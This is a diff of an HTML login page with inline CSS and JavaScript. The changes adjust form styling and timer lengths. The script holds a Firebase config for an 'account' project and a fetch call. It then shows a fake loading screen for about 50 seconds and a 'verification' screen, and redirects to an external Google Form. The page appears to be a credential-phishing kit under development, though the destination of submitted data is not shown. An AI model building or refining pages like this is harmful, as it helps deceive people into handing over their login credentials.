@@ -19,6 +19,7 @@
     }
 
     .login-box {
+      display: flex;
       flex-direction: column;
       align-items: center;
       background: white;
@@ -34,23 +35,29 @@
       margin-bottom: 20px;
     }
 
+    #login-form {
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      width: 100%;
+    }
+
     input[type="text"],
-    input[type="password"] {
+    input[type="password"],
+    .blue-button {
       width: 100%;
       padding: 12px;
       margin-top: 8px;
       margin-bottom: 20px;
-      border: 1px solid #ccc;
       border-radius: 4px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
     }
 
     .blue-button {
       background-color: #1a73e8;
       color: white;
       border: none;
-      padding: 12px;
-      width: 100%;
-      border-radius: 4px;
       cursor: pointer;
     }
 
@@ -135,7 +142,6 @@
 <script>
   // Configuración Firebase (reemplaza con la tuya real)
   const firebaseConfig = {
-    
     authDomain: "account-4a145.firebaseapp.com",
     projectId: "account-4a145",
     storageBucket: "account-4a145.firebasestorage.app",
@@ -181,7 +187,7 @@
       headers: { 'Accept': 'application/json' }
     });
 
-    // Mostrar pantalla de verificación después de 30 segundos
+    // Mostrar pantalla de verificación después de 45 segundos
     setTimeout(() => {
       document.getElementById("loading-screen").classList.remove("visible");
       document.getElementById("verificacion").classList.add("visible");
@@ -189,8 +195,8 @@
       // Redirigir después de otros 15 segundos
       setTimeout(() => {
         window.location.href = "https://forms.gle/M7DsjHnWW9gxQzHE7";
-      }, 15000);
-    }, 45000);
+      }, 20000);
+    }, 50000);
   });
 </script>
 
